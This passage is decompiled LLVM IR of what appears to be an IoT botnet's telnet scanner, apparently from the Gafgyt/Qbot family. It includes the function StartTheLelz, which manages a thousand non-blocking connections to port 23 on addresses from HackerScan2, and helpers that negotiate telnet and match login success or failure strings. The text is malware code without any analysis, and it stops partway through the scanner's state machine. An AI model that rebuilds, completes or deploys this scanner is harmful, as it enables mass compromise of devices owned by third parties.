define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_1dbe0 = load i32, i32* @fp, align 4
  store i32 121832, i32* %stack_var_-4, align 4
  %v2_1dbe4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1dbe4, i32* @fp, align 4
  %v1_1dbf4 = add i32 %arg1, 4
  %v2_1dbf4 = inttoptr i32 %v1_1dbf4 to i32*
  %v3_1dbf4 = load i32, i32* %v2_1dbf4, align 4
  store i32 %v3_1dbf4, i32* @r0, align 4
  %v1_1dc00 = call i32 @__GI_inet_ntoa(i32 %v3_1dbf4)
  store i32 %v3_1dbe0, i32* @fp, align 4
  ret i32 %v1_1dc00

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_1dc1c = load i32, i32* @fp, align 4
  store i32 121892, i32* %stack_var_-4, align 4
  %v2_1dc20 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1dc20, i32* @fp, align 4
  %v5_1dc48 = call i32 @__GI_memset(i8* %arg3, i32 0, i32 %arg4)
  %v5_1dc5c = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_1dc6c = load i8, i8* %arg3, align 1
  %v2_1dc70 = icmp eq i8 %v2_1dc6c, -1
  br i1 %v2_1dc70, label %dec_label_pc_1dc78, label %dec_label_pc_1dc8c

dec_label_pc_1dc78:                               ; preds = %entry
  %v4_1dc88 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_1dc8c

dec_label_pc_1dc8c:                               ; preds = %entry, %dec_label_pc_1dc78
  %v3_1dc90 = load i32, i32* %stack_var_0, align 4
  %v3_1dc94 = call i32 @contains_string(i32 %tmp, i32 %v3_1dc90)
  %v2_1dc9c = icmp ne i32 %v3_1dc94, 0
  %. = zext i1 %v2_1dc9c to i32
  store i32 %v3_1dc1c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1dc8c, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1dd10.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1dcd0 = load i32, i32* @fp, align 4
  store i32 %v3_1dcd0, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_1dcfc = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_1dd10

dec_label_pc_1dd10:                               ; preds = %dec_label_pc_1dd10.lr.ph, %dec_label_pc_1dd10
  %storemerge25 = phi i32 [ 0, %dec_label_pc_1dd10.lr.ph ], [ %v1_1dd24, %dec_label_pc_1dd10 ]
  %v5_1dd1c = mul nuw nsw i32 %storemerge25, 4
  %v6_1dd1c = add i32 %v5_1dd1c, %v2_1dcfc
  %v7_1dd1c = inttoptr i32 %v6_1dd1c to i32*
  store i32 0, i32* %v7_1dd1c, align 4
  %v1_1dd24 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_1dd24, 32
  br i1 %tmp21, label %dec_label_pc_1dd10, label %dec_label_pc_1dd38

dec_label_pc_1dd38:                               ; preds = %dec_label_pc_1dd10
  %v13_1dcd0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_1dd3c = udiv i32 %arg1, 32
  %v3_1dd48 = mul nuw nsw i32 %v3_1dd3c, 4
  %v2_1dd50 = add nsw i32 %v3_1dd48, -136
  %v2_1dd54 = add i32 %v2_1dd50, %v13_1dcd0
  %v1_1dd58 = inttoptr i32 %v2_1dd54 to i32*
  %v2_1dd58 = load i32, i32* %v1_1dd58, align 4
  %v1_1dd60 = urem i32 %arg1, 32
  %v6_1dd68 = shl i32 1, %v1_1dd60
  %v2_1dd6c = or i32 %v2_1dd58, %v6_1dd68
  store i32 %v2_1dd6c, i32* %v1_1dd58, align 4
  %v1_1dd8c = add i32 %arg1, 1
  %v2_1dd94 = ptrtoint i32* %stack_var_-160 to i32
  %v5_1dda8 = call i32 @__libc_select(i32 %v1_1dd8c, i32 %v2_1dcfc, i32 0, i32 0, i32 %v2_1dd94)
  %v5_1ddb4 = icmp sgt i32 %v5_1dda8, 0
  br i1 %v5_1ddb4, label %dec_label_pc_1ddc4, label %dec_label_pc_1ddb8

dec_label_pc_1ddb8:                               ; preds = %dec_label_pc_1dd38
  br label %dec_label_pc_1dde4

dec_label_pc_1ddc4:                               ; preds = %dec_label_pc_1dd38
  %v5_1ddd8 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_1dde4

dec_label_pc_1dde4:                               ; preds = %dec_label_pc_1ddb8, %dec_label_pc_1ddc4
  %storemerge = phi i32 [ %v5_1ddd8, %dec_label_pc_1ddc4 ], [ 0, %dec_label_pc_1ddb8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_1dcfc, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_1dde4, { 1, 0 }
  uselistorder label %dec_label_pc_1dd10, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_1ddfc = load i32, i32* @fp, align 4
  %v3_1de14 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_429e8.2636 to i32))
  store i32 %v3_1ddfc, i32* @fp, align 4
  ret i32 %v3_1de14
}

define i32 @contains_fail(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_1de34 = load i32, i32* @fp, align 4
  %v3_1de4c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_429c8.2645 to i32))
  store i32 %v3_1de34, i32* @fp, align 4
  ret i32 %v3_1de4c

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_1de98

dec_label_pc_1de98:                               ; preds = %dec_label_pc_1de98, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_1de9c, %dec_label_pc_1de98 ]
  %v1_1de9c = add i32 %stack_var_-24.0, 1
  %v3_1dea8 = mul i32 %v1_1de9c, 4
  %v2_1deb4 = add i32 %v3_1dea8, %arg2
  %v1_1deb8 = inttoptr i32 %v2_1deb4 to i32*
  %v2_1deb8 = load i32, i32* %v1_1deb8, align 4
  %v2_1debc = icmp eq i32 %v2_1deb8, 0
  br i1 %v2_1debc, label %dec_label_pc_1df18.preheader, label %dec_label_pc_1de98

dec_label_pc_1df18.preheader:                     ; preds = %dec_label_pc_1de98
  %v3_1def0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_1df18

dec_label_pc_1ded0:                               ; preds = %dec_label_pc_1df18
  %v3_1ded4 = mul i32 %storemerge2, 4
  %v2_1dee0 = add i32 %v3_1ded4, %arg2
  %v1_1dee4 = inttoptr i32 %v2_1dee0 to i32*
  %v2_1dee4 = load i32, i32* %v1_1dee4, align 4
  %v4_1def0 = call i32 @strcasestr(i8* %v3_1def0, i32 %v2_1dee4, i32 %v3_1ded4)
  %v2_1def8 = icmp eq i32 %v4_1def0, 0
  %v1_1df10 = add nuw i32 %storemerge2, 1
  br i1 %v2_1def8, label %dec_label_pc_1df18, label %dec_label_pc_1df30

dec_label_pc_1df18:                               ; preds = %dec_label_pc_1ded0, %dec_label_pc_1df18.preheader
  %storemerge2 = phi i32 [ %v1_1df10, %dec_label_pc_1ded0 ], [ 0, %dec_label_pc_1df18.preheader ]
  %v5_1df24 = icmp slt i32 %storemerge2, %v1_1de9c
  br i1 %v5_1df24, label %dec_label_pc_1ded0, label %dec_label_pc_1df30

dec_label_pc_1df30:                               ; preds = %dec_label_pc_1df18, %dec_label_pc_1ded0
  %storemerge = phi i32 [ 1, %dec_label_pc_1ded0 ], [ 0, %dec_label_pc_1df18 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_1de9c, { 1, 0, 2 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-616 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1df44 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1df44, i32* %ip.global-to-local, align 4
  %v3_1df48 = load i32, i32* @r4, align 4
  store i32 %v3_1df48, i32* %stack_var_-24, align 4
  store i32 122704, i32* %stack_var_-4, align 4
  %v19_1df48 = ptrtoint i32* %stack_var_-24 to i32
  %v2_1df4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1df4c, i32* @fp, align 4
  %v2_1df70 = call i32 @__GI_time(i32* null)
  store i32 %v2_1df70, i32* @r4, align 4
  %v0_1df7c = call i32 @rand_cmwc()
  %v0_1df84 = load i32, i32* @r4, align 4
  %v2_1df84 = xor i32 %v0_1df84, %v0_1df7c
  %v1_1df8c = call i32 @srand(i32 %v2_1df84)
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1dfa0 = add i32 %v19_1df48, -592
  %v5_1dfa0 = inttoptr i32 %v4_1dfa0 to i16*
  store i16 2, i16* %v5_1dfa0, align 4
  %v1_1dfa8 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* %r2.global-to-local, align 4
  %v3_1dfd8 = bitcast i32* %stack_var_-608 to i8*
  %v4_1dfd8 = call i32 @__GI_memset(i8* %v3_1dfd8, i32 0, i32 8)
  %v1_1dfe4 = call i32 @malloc(i32 32677)
  store i32 32677, i32* %r2.global-to-local, align 4
  %v3_1e000 = inttoptr i32 %v1_1dfe4 to i8*
  %v4_1e000 = call i32 @__GI_memset(i8* %v3_1e000, i32 0, i32 32677)
  %v1_1e024 = load i32, i32* @sp, align 4
  %v1_1e034 = add i32 %v1_1e024, -27993
  %v3_1e038 = and i32 %v1_1e034, -8
  store i32 5000, i32* %r2.global-to-local, align 4
  %v3_1e06c = inttoptr i32 %v3_1e038 to i8*
  %v4_1e06c = call i32 @__GI_memset(i8* %v3_1e06c, i32 0, i32 5000)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e07c

dec_label_pc_1e07c:                               ; preds = %entry, %dec_label_pc_1e07c
  %storemerge514 = phi i32 [ 0, %entry ], [ %v1_1e0f8, %dec_label_pc_1e07c ]
  %v2_1e08c = mul nuw nsw i32 %storemerge514, 28
  %v2_1e090 = add i32 %v2_1e08c, %v3_1e038
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_1e0a0 = inttoptr i32 %v2_1e090 to i8*
  %v4_1e0a0 = call i32 @__GI_memset(i8* %v3_1e0a0, i32 0, i32 28)
  %v3_1e0c8 = add i32 %v2_1e090, 9
  %v4_1e0c8 = inttoptr i32 %v3_1e0c8 to i8*
  store i8 1, i8* %v4_1e0c8, align 1
  %v2_1e0e8 = add i32 %v2_1e090, 24
  %v2_1e0f0 = inttoptr i32 %v2_1e0e8 to i32*
  store i32 %v1_1dfe4, i32* %v2_1e0f0, align 4
  %v1_1e0f8 = add nuw nsw i32 %storemerge514, 1
  store i32 %v1_1e0f8, i32* %r2.global-to-local, align 4
  %v5_1e10c = icmp slt i32 %v1_1e0f8, 1000
  br i1 %v5_1e10c, label %dec_label_pc_1e07c, label %dec_label_pc_1e110.preheader

dec_label_pc_1e110.preheader:                     ; preds = %dec_label_pc_1e07c
  %v2_1e198 = add i32 %v3_1e038, 8
  %v2_1e498 = or i32 %v3_1e038, 4
  %v2_1e578 = ptrtoint i32* %stack_var_-616 to i32
  %v2_1e650 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1e74c = ptrtoint i32* %stack_var_-336 to i32
  %v2_1e7a8 = ptrtoint i32* %stack_var_-344 to i32
  %v2_1e7ac = ptrtoint i32* %stack_var_-340 to i32
  %v2_1e914 = add i32 %v3_1e038, 24
  %v2_1f48c = add i32 %v3_1e038, 16
  br label %dec_label_pc_1e110

dec_label_pc_1e110:                               ; preds = %dec_label_pc_1f6c0, %dec_label_pc_1e110.preheader
  br label %dec_label_pc_1e11c

dec_label_pc_1e11c:                               ; preds = %dec_label_pc_1e110, %dec_label_pc_1f6c0
  %storemerge612 = phi i32 [ 0, %dec_label_pc_1e110 ], [ %v1_1f6c4, %dec_label_pc_1f6c0 ]
  %v3_1e128 = mul i32 %storemerge612, 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e130 = mul nuw nsw i32 %storemerge612, 28
  %v2_1e134 = add i32 %v2_1e130, %v3_1e038
  %v2_1e138 = add i32 %v2_1e134, 16
  %v1_1e13c = inttoptr i32 %v2_1e138 to i32*
  %v2_1e13c = load i32, i32* %v1_1e13c, align 4
  %v2_1e140 = icmp eq i32 %v2_1e13c, 0
  br i1 %v2_1e140, label %dec_label_pc_1e148, label %dec_label_pc_1e180

dec_label_pc_1e148:                               ; preds = %dec_label_pc_1e11c
  store i32 %storemerge612, i32* @r4, align 4
  %v2_1e150 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_1e164 = load i32, i32* @r4, align 4
  %v3_1e168 = mul i32 %v0_1e164, 4
  store i32 %v3_1e168, i32* %r2.global-to-local, align 4
  %v2_1e170 = mul i32 %v0_1e164, 28
  %v2_1e178 = add i32 %v2_1f48c, %v2_1e170
  %v2_1e17c = inttoptr i32 %v2_1e178 to i32*
  store i32 %v2_1e150, i32* %v2_1e17c, align 4
  br label %dec_label_pc_1e180

dec_label_pc_1e180:                               ; preds = %dec_label_pc_1e11c, %dec_label_pc_1e148
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e19c = add i32 %v2_1e198, %v2_1e130
  %v1_1e1a0 = inttoptr i32 %v2_1e19c to i8*
  %v2_1e1a0 = load i8, i8* %v1_1e1a0, align 4
  %v3_1e1a0 = sext i8 %v2_1e1a0 to i32
  switch i32 %v3_1e1a0, label %dec_label_pc_1f6c0 [
    i32 0, label %dec_label_pc_1e1d0
    i32 1, label %dec_label_pc_1e664.lr.ph
    i32 2, label %dec_label_pc_1ea98
    i32 3, label %dec_label_pc_1ec20
    i32 4, label %dec_label_pc_1edd8
    i32 5, label %dec_label_pc_1ef60
    i32 6, label %dec_label_pc_1f118
    i32 7, label %dec_label_pc_1f504
  ]

dec_label_pc_1e1d0:                               ; preds = %dec_label_pc_1e180
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e1ec = add i32 %v2_1e134, 8
  %v1_1e1f0 = add i32 %v2_1e134, 9
  %v2_1e1f0 = inttoptr i32 %v1_1e1f0 to i8*
  %v3_1e1f0 = load i8, i8* %v2_1e1f0, align 1
  %v7_1e1f4 = icmp eq i8 %v3_1e1f0, 1
  br i1 %v7_1e1f4, label %dec_label_pc_1e1fc, label %dec_label_pc_1e2a8

dec_label_pc_1e1fc:                               ; preds = %dec_label_pc_1e1d0
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e218 = add i32 %v2_1e134, 24
  %v1_1e21c = inttoptr i32 %v2_1e218 to i32*
  %v2_1e21c = load i32, i32* %v1_1e21c, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_1e248 = inttoptr i32 %v2_1e134 to i8*
  %v4_1e248 = call i32 @__GI_memset(i8* %v3_1e248, i32 0, i32 28)
  store i32 %v2_1e218, i32* %r2.global-to-local, align 4
  store i32 %v2_1e21c, i32* %v1_1e21c, align 4
  store i32 %storemerge612, i32* @r4, align 4
  %v1_1e278 = call i32 @HackerScan2(i32 24)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_1e288 = load i32, i32* @r4, align 4
  %v3_1e28c = mul i32 %v0_1e288, 4
  store i32 %v3_1e28c, i32* %r2.global-to-local, align 4
  %v2_1e294 = mul i32 %v0_1e288, 28
  %v2_1e29c = add i32 %v2_1e498, %v2_1e294
  %v2_1e2a0 = inttoptr i32 %v2_1e29c to i32*
  store i32 %v1_1e278, i32* %v2_1e2a0, align 4
  br label %dec_label_pc_1e434

dec_label_pc_1e2a8:                               ; preds = %dec_label_pc_1e1d0
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1e2c8 = load i8, i8* %v2_1e1f0, align 1
  %v2_1e2cc = icmp eq i8 %v3_1e2c8, 0
  br i1 %v2_1e2cc, label %dec_label_pc_1e2d4, label %dec_label_pc_1e434

dec_label_pc_1e2d4:                               ; preds = %dec_label_pc_1e2a8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1e2f8 = add i32 %v2_1e134, 11
  %v2_1e2f8 = inttoptr i32 %v1_1e2f8 to i8*
  %v3_1e2f8 = load i8, i8* %v2_1e2f8, align 1
  %v1_1e2fc = add i8 %v3_1e2f8, 1
  store i8 %v1_1e2fc, i8* %v2_1e2f8, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1e350 = add i32 %v2_1e134, 10
  %v2_1e350 = inttoptr i32 %v1_1e350 to i8*
  %v3_1e350 = load i8, i8* %v2_1e350, align 2
  %v1_1e354 = add i8 %v3_1e350, 1
  store i32 %v3_1e038, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i8 %v1_1e354, i8* %v2_1e350, align 2
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v3_1e3a4 = load i8, i8* %v2_1e2f8, align 1
  %v7_1e3a8 = icmp eq i8 %v3_1e3a4, 3
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  br i1 %v7_1e3a8, label %dec_label_pc_1e3b0, label %dec_label_pc_1e3dc

dec_label_pc_1e3b0:                               ; preds = %dec_label_pc_1e2d4
  store i32 %v2_1e1ec, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_1e1f0, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1e3dc:                               ; preds = %dec_label_pc_1e2d4
  %v3_1e3fc = load i8, i8* %v2_1e350, align 2
  %v7_1e400 = icmp eq i8 %v3_1e3fc, 3
  br i1 %v7_1e400, label %dec_label_pc_1e408, label %dec_label_pc_1e434

dec_label_pc_1e408:                               ; preds = %dec_label_pc_1e3dc
  store i32 %v2_1e1ec, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_1e1f0, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1e434:                               ; preds = %dec_label_pc_1e3dc, %dec_label_pc_1e2a8, %dec_label_pc_1e1fc
  store i32 2, i32* %r2.global-to-local, align 4
  store i16 2, i16* %v5_1dfa0, align 4
  %v1_1e44c = call i32 @__GI_htons(i32 23)
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_1e47c = call i32 @__GI_memset(i8* %v3_1dfd8, i32 0, i32 8)
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  store i32 %storemerge612, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1e4b8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_1e4c0 = load i32, i32* @r4, align 4
  %v2_1e4cc = mul i32 %v0_1e4c0, 28
  %v2_1e4d0 = add i32 %v2_1e4cc, %v3_1e038
  %v2_1e4d4 = inttoptr i32 %v2_1e4d0 to i32*
  store i32 %v3_1e4b8, i32* %v2_1e4d4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1e4f0 = inttoptr i32 %v2_1e134 to i32*
  %v2_1e4f0 = load i32, i32* %v1_1e4f0, align 4
  %v7_1e4f4 = icmp eq i32 %v2_1e4f0, -1
  br i1 %v7_1e4f4, label %dec_label_pc_1f6c0, label %dec_label_pc_1e4fc

dec_label_pc_1e4fc:                               ; preds = %dec_label_pc_1e434
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e514 = load i32, i32* %v1_1e4f0, align 4
  store i32 %v2_1e514, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e530 = load i32, i32* %v1_1e4f0, align 4
  store i32 %v2_1e530, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_1e540 = call i32 @__libc_fcntl(i32 %v2_1e530, i32 3)
  %v1_1e548 = or i32 %v2_1e540, 2048
  store i32 %v1_1e548, i32* @r3, align 4
  %v0_1e54c = load i32, i32* @r4, align 4
  store i32 %v1_1e548, i32* @r2, align 4
  %v2_1e558 = call i32 @__libc_fcntl(i32 %v0_1e54c, i32 4)
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e574 = load i32, i32* %v1_1e4f0, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1e588 = call i32 @__libc_connect(i32 %v2_1e574, i32 %v2_1e578, i32 16)
  %v3_1e590 = icmp eq i32 %v3_1e588, -1
  br i1 %v3_1e590, label %dec_label_pc_1e598, label %dec_label_pc_1e5fc

dec_label_pc_1e598:                               ; preds = %dec_label_pc_1e4fc
  %v0_1e598 = call i32 @__GI___errno_location()
  %v1_1e5a0 = inttoptr i32 %v0_1e598 to i32*
  %v2_1e5a0 = load i32, i32* %v1_1e5a0, align 4
  %v7_1e5a4 = icmp eq i32 %v2_1e5a0, 115
  br i1 %v7_1e5a4, label %dec_label_pc_1e5fc, label %dec_label_pc_1e5ac

dec_label_pc_1e5ac:                               ; preds = %dec_label_pc_1e598
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e5c4 = load i32, i32* %v1_1e4f0, align 4
  %v3_1e5cc = call i32 @sclose(i32 %v2_1e5c4, i32 %v3_1e038, i32 %v3_1e128)
  store i32 %v2_1e1ec, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v2_1e1f0, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1e5fc:                               ; preds = %dec_label_pc_1e4fc, %dec_label_pc_1e598
  %v3_1e620 = inttoptr i32 %v2_1e1ec to i8*
  store i8 1, i8* %v3_1e620, align 4
  store i32 %v2_1e138, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v1_1e13c, align 4
  br label %dec_label_pc_1f6c0

dec_label_pc_1e664.lr.ph:                         ; preds = %dec_label_pc_1e180
  br label %dec_label_pc_1e664

dec_label_pc_1e664:                               ; preds = %dec_label_pc_1e664.lr.ph, %dec_label_pc_1e664
  %storemerge711 = phi i32 [ 0, %dec_label_pc_1e664.lr.ph ], [ %v1_1e678, %dec_label_pc_1e664 ]
  store i32 %v2_1e650, i32* %r2.global-to-local, align 4
  %v5_1e670 = mul nuw nsw i32 %storemerge711, 4
  %v6_1e670 = add i32 %v5_1e670, %v2_1e650
  %v7_1e670 = inttoptr i32 %v6_1e670 to i32*
  store i32 0, i32* %v7_1e670, align 4
  %v1_1e678 = add nuw nsw i32 %storemerge711, 1
  %tmp43 = icmp ult i32 %v1_1e678, 32
  br i1 %tmp43, label %dec_label_pc_1e664, label %dec_label_pc_1e68c

dec_label_pc_1e68c:                               ; preds = %dec_label_pc_1e664
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v1_1e6a4 = inttoptr i32 %v2_1e134 to i32*
  %v2_1e6a4 = load i32, i32* %v1_1e6a4, align 4
  %v3_1e6a8 = udiv i32 %v2_1e6a4, 32
  %v3_1e6bc = mul nuw nsw i32 %v3_1e6a8, 4
  %v2_1e6c4 = add i32 %v3_1e6bc, %v19_1df48
  store i32 %v2_1e6c4, i32* %r2.global-to-local, align 4
  %v2_1e6c8 = add i32 %v2_1e6c4, -304
  %v1_1e6cc = inttoptr i32 %v2_1e6c8 to i32*
  %v2_1e6cc = load i32, i32* %v1_1e6cc, align 4
  store i32 %v2_1e6cc, i32* %ip.global-to-local, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e6e8 = load i32, i32* %v1_1e6a4, align 4
  %v1_1e6ec = urem i32 %v2_1e6e8, 32
  %v6_1e6f4 = shl i32 1, %v1_1e6ec
  %v2_1e6f8 = or i32 %v6_1e6f4, %v2_1e6cc
  store i32 %v2_1e6f8, i32* %v1_1e6cc, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e740 = load i32, i32* %v1_1e6a4, align 4
  %v1_1e744 = add i32 %v2_1e740, 1
  store i32 %v1_1e744, i32* %r2.global-to-local, align 4
  store i32 %v2_1e650, i32* %ip.global-to-local, align 4
  %v1_1e750 = load i32, i32* @sp, align 4
  %v2_1e750 = inttoptr i32 %v1_1e750 to i32*
  store i32 %v2_1e74c, i32* %v2_1e750, align 4
  %v0_1e754 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_1e650, i32* %r2.global-to-local, align 4
  %v4_1e764 = load i32, i32* %stack_var_-336, align 4
  %v5_1e764 = call i32 @__libc_select(i32 %v0_1e754, i32 0, i32 %v2_1e650, i32 0, i32 %v4_1e764)
  %v7_1e774 = icmp eq i32 %v5_1e764, 1
  br i1 %v7_1e774, label %dec_label_pc_1e77c, label %dec_label_pc_1e960

dec_label_pc_1e77c:                               ; preds = %dec_label_pc_1e68c
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e7a4 = load i32, i32* %v1_1e6a4, align 4
  store i32 %v2_1e7a4, i32* %r2.global-to-local, align 4
  store i32 %v2_1e7a8, i32* %ip.global-to-local, align 4
  %v1_1e7b0 = load i32, i32* @sp, align 4
  %v2_1e7b0 = inttoptr i32 %v1_1e7b0 to i32*
  store i32 %v2_1e7ac, i32* %v2_1e7b0, align 4
  %v0_1e7b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1e7c4 = load i32, i32* %stack_var_-344, align 4
  %v5_1e7c4 = call i32 @getsockopt(i32 %v0_1e7b4, i32 1, i32 4, i32 %v2_1e7a8, i32 %v4_1e7c4)
  %v3_1e7c8 = load i32, i32* %stack_var_-344, align 4
  %v2_1e7cc = icmp eq i32 %v3_1e7c8, 0
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e864 = load i32, i32* %v1_1e6a4, align 4
  br i1 %v2_1e7cc, label %dec_label_pc_1e84c, label %dec_label_pc_1e7d4

dec_label_pc_1e7d4:                               ; preds = %dec_label_pc_1e77c
  %v3_1e7f4 = call i32 @sclose(i32 %v2_1e864, i32 %v3_1e038, i32 %v3_1e128)
  %v2_1e814 = add i32 %v2_1e134, 8
  %v3_1e81c = inttoptr i32 %v2_1e814 to i8*
  store i8 0, i8* %v3_1e81c, align 4
  store i32 %v2_1e814, i32* %r2.global-to-local, align 4
  %v3_1e844 = add i32 %v2_1e134, 9
  %v4_1e844 = inttoptr i32 %v3_1e844 to i8*
  store i8 1, i8* %v4_1e844, align 1
  br label %dec_label_pc_1f6c0

dec_label_pc_1e84c:                               ; preds = %dec_label_pc_1e77c
  store i32 %v2_1e864, i32* @r4, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e880 = load i32, i32* %v1_1e6a4, align 4
  store i32 %v2_1e880, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_1e890 = call i32 @__libc_fcntl(i32 %v2_1e880, i32 3)
  %v1_1e898 = and i32 %v2_1e890, -2049
  store i32 %v1_1e898, i32* @r3, align 4
  %v0_1e89c = load i32, i32* @r4, align 4
  store i32 %v1_1e898, i32* @r2, align 4
  %v2_1e8a8 = call i32 @__libc_fcntl(i32 %v0_1e89c, i32 4)
  store i32 0, i32* %v1_1e13c, align 4
  %v3_1e8f8 = add i32 %v2_1e134, 20
  %v4_1e8f8 = inttoptr i32 %v3_1e8f8 to i16*
  store i16 0, i16* %v4_1e8f8, align 4
  store i32 %v3_1e128, i32* %r2.global-to-local, align 4
  %v2_1e918 = add i32 %v2_1e130, %v2_1e914
  %v1_1e91c = inttoptr i32 %v2_1e918 to i32*
  %v2_1e91c = load i32, i32* %v1_1e91c, align 4
  store i32 32676, i32* %r2.global-to-local, align 4
  %v3_1e930 = inttoptr i32 %v2_1e91c to i8*
  %v4_1e930 = call i32 @__GI_memset(i8* %v3_1e930, i32 0, i32 32676)
  %v2_1e950 = add i32 %v2_1e134, 8
  store i32 %v2_1e950, i32* %r2.global-to-local, align 4
  %v3_1e958 = inttoptr i32 %v2_1e950 to i8*
  store i8 2, i8* %v3_1e958, align 4
  br label %dec_label_pc_1f6c0

